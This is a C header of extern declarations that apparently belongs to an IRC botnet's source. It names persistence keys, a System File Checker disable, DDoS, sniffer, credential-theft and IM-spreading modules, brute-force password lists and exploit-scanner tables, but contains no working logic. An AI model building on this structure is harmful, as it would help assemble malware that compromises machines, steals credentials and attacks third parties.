extern char botid[];
extern char version[];
extern char mutexhandle[];
extern char movepath[];
extern char filename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern int authsize;
extern int eftpsends;
extern SERVER servers[];
extern int curserver;
#ifndef NO_VERSION_REPLY
extern int curversion;
char *versionlist[];
extern int bindshellsize;
#endif

#ifndef NO_MELT
extern REGENT meltkey;
#endif

#ifndef NO_SFCDISABLE
extern char sfc_dllname[];
#endif

#ifndef NO_SERVICE
extern char servicename[];
extern char servicedisplayname[];
extern char servicedesc[];
#else
extern REGENT runkey;
#endif

#ifndef NO_RECORD_UPTIME
extern REGENT rupkey;
#endif

#ifndef NO_INSTALLED_TIME
extern REGENT itkey;
#endif
extern char drives_title[];

extern char process_title[];
extern char irc_title[];
extern char scan_title[];
extern char ftp_title[];
extern char mirc_title[];
extern char file_title[];
extern char download_title[];
extern char update_title[];
extern char logic_title[];
extern char reg_title[];
extern char pstore_title[];
extern char netstatp_title[];
extern char tcp_title[];
extern char udp_title[];
extern char speedtest_title[];
extern char sock4_title[];
extern char ddos_title[];
extern char redirect_title[];
extern char warn_title[];
extern char sniffer_title[];
extern char ddos_title[];
extern char imspread_title[];
extern char msnspread_title[];
extern char aimspread_title[];
extern char *mypasses[];
extern char *usernames[];
extern HANDLE ih;

extern char *ip1parse;
extern char *ip2parse;
extern char exip[MAX_IP];
extern char inip[MAX_IP];
extern char host[MAX_HOSTNAME];

extern int FTP_PORT;
extern unsigned short ftpdport;
extern BOOL staticftpd;
extern unsigned short sock4port;
extern unsigned short redirport;

extern DWORD dwstarted;
extern DWORD dwconnected;

extern char main_title[];
extern char threads_title[];
extern char sec_title[];
extern char unsec_title[];

extern THREAD threads[MAX_THREADS];

extern char installedt[128];
//extern BOOL rkenabled;
extern HANDLE mutex;

// The login command needs extern for protocol.cpp
extern const char cmd_login_1[];
extern const char cmd_login_2[];

#ifndef NO_ADVSCAN
extern EXPLOIT exploit[];
extern SCANALL scanall[];
extern int scanallsize;
extern SCANALL lsascan[];
extern int lsascansize;
extern SCANALL ntscan[];
extern int ntscansize;
extern SCANALL wksescan[];
extern int wksescansize;
extern SCANALL wksoscan[];
extern int wksoscansize;
extern SCANALL asnscan[];
extern int asnscansize;
#endif